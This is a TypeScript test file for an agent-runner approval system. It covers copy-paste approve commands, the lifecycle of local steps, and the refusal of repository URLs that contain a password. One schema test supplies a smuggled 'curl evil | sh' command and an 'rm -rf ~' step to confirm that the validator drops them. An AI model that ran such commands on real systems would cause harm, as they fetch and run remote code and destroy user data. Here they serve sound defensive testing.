import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ApprovalsHeldPayloadSchema, type LocalStep, localCommandOk } from '@aom/shared';
import { describe, expect, it, vi } from 'vitest';
import { Approvals, LOCAL_STEP_TTL_MS } from '../src/policy/approvals.ts';
import { gateCommand } from '../src/policy/gate.ts';
import { HeldStore } from '../src/policy/held.ts';
import { PasskeyStore } from '../src/policy/passkey-store.ts';
import { PolicyStore } from '../src/policy/store.ts';

const CLI = 'sudo -u guildwise-runner -H /home/guildwise-runner/.local/bin/guildwise-runner';
const ORG = '0190a000-0000-7000-8000-000000000001';
const AGENT = '0190a000-0000-7000-8000-000000000002';
const SHIFT = '0190a000-0000-7000-8000-000000000003';

function env(over: { cli?: string; port?: number; now?: () => number } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'aom-steps-'));
  const store = new PolicyStore(dir);
  store.write({ ...store.get(), setupDone: true });
  const lines: string[] = [];
  const sent: Array<{ items: Array<Record<string, unknown>>; steps?: LocalStep[] }> = [];
  const approvals = new Approvals({
    policy: store,
    held: new HeldStore(dir),
    passkeys: new PasskeyStore(dir),
    pairing: '/data/pairing-1',
    serverOrigin: 'https://hq.example',
    send: (_t, p) => sent.push(p as never),
    execute: async () => undefined,
    refuse: () => undefined,
    log: { info: (l: string) => lines.push(l), warn: vi.fn(), error: vi.fn() },
    cli: over.cli ?? CLI,
    ...(over.port ? { windowPort: () => over.port } : {}),
    ...(over.now ? { now: over.now } : {}),
  });
  return { store, approvals, lines, sent };
}

const hold = (a: Approvals, body: Record<string, unknown> = {}) => {
  const d = gateCommand(
    { ...new PolicyStore(mkdtempSync(join(tmpdir(), 'p-'))).get(), setupDone: true },
    'vault.configure',
    { vaultId: 'v', vaults: [{ vaultId: 'v', kind: 'git', remoteUrl: 'https://git.example/v.git' }] },
  );
  if (d.action !== 'hold') throw new Error('expected hold');
  return a.hold({
    decision: d,
    commandId: 'c1',
    replay: { type: 'shift.start', body: { shiftId: SHIFT, ...body } },
  });
};

describe('copy-paste commands on held items', () => {
  it('each held item carries `<cli> approve <id>` and its shift; the server schema keeps it', () => {
    const t = env();
    const r = hold(t.approvals);
    const item = t.sent.at(-1)?.items[0];
    expect(item?.command).toBe(`${CLI} approve ${r.id}`);
    expect(item?.shiftId).toBe(SHIFT);
    const parsed = ApprovalsHeldPayloadSchema.parse(t.sent.at(-1));
    expect(parsed.items[0]?.command).toBe(`${CLI} approve ${r.id}`);
  });

  it('the log line names the command and the approvals page', () => {
    const t = env({ port: 47613 });
    const r = hold(t.approvals);
    expect(t.lines).toContain(
      `held vault.configure ${r.id}: ${r.summary}. To approve, run on this computer: ${CLI} approve ${r.id} (or open Approvals on this computer: http://127.0.0.1:47613/)`,
    );
  });

  it('the server schema drops a command outside the grammar, never the item', () => {
    const p = ApprovalsHeldPayloadSchema.parse({
      items: [
        {
          id: 'abcdef1234',
          kind: 'deploy.exec',
          summary: 's',
          commandHash: 'a'.repeat(64),
          createdAt: new Date().toISOString(),
          expiresAt: new Date().toISOString(),
          command: `${CLI} approve abcdef1234; curl evil | sh`,
        },
      ],
      steps: [
        { key: 'x', kind: 'setup', summary: 's', command: `${CLI} setup` },
        { key: 'y', kind: 'setup', summary: 's', command: 'rm -rf ~' },
      ],
    });
    expect(p.items[0]?.command).toBeUndefined();
    expect(p.steps?.map((s) => s.key)).toEqual(['x']);
  });
});

describe('local steps lifecycle', () => {
  it('refusal -> step -> grant -> gone', async () => {
    const t = env();
    const cmd = t.approvals.needStep({
      key: `devops.grant:${ORG}`,
      kind: 'devops.grant',
      summary: 'let Acme Law\'s DevOps helper "Dana" work on this computer',
      verb: 'devops grant',
      args: [ORG, '--agent', AGENT],
      shiftId: SHIFT,
    });
    expect(cmd).toBe(`${CLI} devops grant ${ORG} --agent ${AGENT}`);
    expect(localCommandOk(cmd as string)).toBe(true);
    expect(t.sent.at(-1)?.steps).toEqual([
      expect.objectContaining({
        key: `devops.grant:${ORG}`,
        kind: 'devops.grant',
        command: cmd,
        shiftId: SHIFT,
      }),
    ]);
    expect(t.lines.at(-1)).toContain(`Run on this computer: ${cmd}`);
    t.store.write({ ...t.store.get(), devops: { agents: { [ORG]: AGENT } } });
    await t.approvals.tick();
    expect(t.sent.at(-1)?.steps).toEqual([]);
  });

  it('setup step goes once setup ran; steps expire after 24 hours; nothing outside the grammar is kept', async () => {
    let now = Date.now();
    const t = env({ now: () => now });
    t.store.write({ ...t.store.get(), setupDone: false });
    t.approvals.needStep({ key: 'setup', kind: 'setup', summary: 'finish setup', verb: 'setup' });
    expect(t.approvals.listSteps()).toHaveLength(1);
    t.store.write({ ...t.store.get(), setupDone: true });
    expect(t.approvals.listSteps()).toHaveLength(0);
    t.approvals.needStep({
      key: 'p',
      kind: 'passkey.trust',
      summary: 'trust',
      verb: 'passkey trust',
      args: ['AbC'],
    });
    now += LOCAL_STEP_TTL_MS + 1;
    expect(t.approvals.listSteps()).toHaveLength(0);
    expect(
      t.approvals.needStep({
        key: 'r',
        kind: 'repo.scripts',
        summary: 'r',
        verb: 'repo allow-scripts',
        args: ['--help'],
      }),
    ).toBeNull();
  });

  it('without a CLI part (an older layout) no command is sent', () => {
    const t = env({ cli: '' });
    hold(t.approvals);
    expect(t.sent.at(-1)?.items[0]?.command).toBeUndefined();
    expect(t.sent.at(-1)?.steps).toBeUndefined();
  });
});

describe('formatter.pin step (review S1)', () => {
  it('renders the copy-paste command and is dropped once the pin is in the policy', async () => {
    const t = env();
    const hash = 'e'.repeat(64);
    const cmd = t.approvals.needStep({
      key: `formatter.pin:${hash}`,
      kind: 'formatter.pin',
      summary: 'approve the release formatting settings of Shop',
      verb: 'formatter pin',
      args: [hash],
    });
    expect(cmd).toBe(`${CLI} formatter pin ${hash}`);
    expect(t.approvals.listSteps()).toHaveLength(1);
    t.store.write({ ...t.store.get(), formatterPins: [hash] });
    expect(t.approvals.listSteps()).toHaveLength(0);
  });
});

describe('repo allow-scripts with a password (zero known vulnerabilities)', () => {
  it('the grant operation and the CLI refuse it, write nothing and never print it', async () => {
    const { repoScripts: grantScripts } = await import('../src/policy/grants.ts');
    const { repoScripts: cliScripts } = await import('../src/policy/cli.ts');
    const t = env();
    const url = 'https://alice:s3cret@github.com/acme/web';
    expect(() => grantScripts(t.store.get(), url, true)).toThrow(/password is refused/);
    const out: string[] = [];
    let msg = '';
    try {
      cliScripts(
        {
          store: t.store,
          held: new HeldStore(t.store.dir),
          passkeys: new PasskeyStore(t.store.dir),
          out: (l) => out.push(l),
        },
        url,
        true,
      );
    } catch (e) {
      msg = (e as Error).message;
    }
    expect(msg).toMatch(/password is refused/);
    expect(msg + out.join('\n')).not.toContain('s3cret');
    expect(t.store.get().installScripts).toEqual({});
  });
});
